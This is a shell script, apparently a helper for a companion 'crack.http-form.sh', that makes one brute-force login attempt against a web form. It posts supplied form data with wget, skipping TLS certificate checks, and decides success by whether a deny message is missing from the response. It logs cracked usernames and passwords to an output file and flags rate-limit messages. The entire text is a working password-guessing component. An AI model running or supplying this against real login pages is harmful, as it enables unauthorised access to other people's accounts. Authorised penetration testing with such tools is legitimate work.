#!/bin/sh
if [ $# -lt 6 ]; then
	echo "Usage: $0 <post data> <full URL> <deny message> <user name> <password> <outputfile> [wait msg]"
	echo "If <deny message> starts with '-v ' then the match will be inverted (deny becomes success)"
	echo ""
	echo "This script was meant to be used with crack.http-form.sh"
	echo ""

	exit 1
fi

PARAMLIST=`echo "$1" | sed 's|^"||' | sed 's|"$||'`
FULLURL="$2"
DENYMSG="$3"
CURUSER="$4"
CURPASSWORD="$5"
OUTPUTFILE="$6"
WAITMSG=""

if [ $# -gt 6 ]; then
	WAITMSG="$7"
fi

HTTPRESPONSE=`wget --no-check-certificate -O - --post-data=$PARAMLIST $FULLURL 2>/dev/null`

INVERTED=`echo "$DENYMSG" | grep -E "^.?-v" | wc -l`

MATCH=0

if [ $INVERTED -eq 0 ]; then
	echo "$HTTPRESPONSE" | grep -i "$DENYMSG" > /dev/null

	if [ $? -gt 0 ]; then
		# Deny message not found therefore a match
		MATCH=1
	fi
else
	DENYMSG=`echo "$DENYMSG" | sed "s|-v ||"`
	echo "$HTTPRESPONSE" | grep -iv "$DENYMSG" > /dev/null

	if [ $? -eq 0 ]; then
		# -v inverts, so not finding deny is success / match
		MATCH=1
	fi
fi

if [ $MATCH -eq 1 ]; then
	echo "Found match..."  >> $OUTPUTFILE
	echo "Request: wget --no-check-certificate -O - --post-data=\"$PARAMLIST\" $FULLURL" >> $OUTPUTFILE
	echo "User: $CURUSER" >> $OUTPUTFILE
	echo "Password: $CURPASSWORD" >> $OUTPUTFILE
	touch $CURUSER.tmp
fi

if [ ${#WAITMSG} -gt 0 ]; then
	echo "$HTTPRESPONSE" | grep -i "$WAITMSG" > /dev/null

	if [ $? -eq 0 ]; then
		# Found wait message.  Signal stop.
		touch $CURUSER.wait
	fi
fi

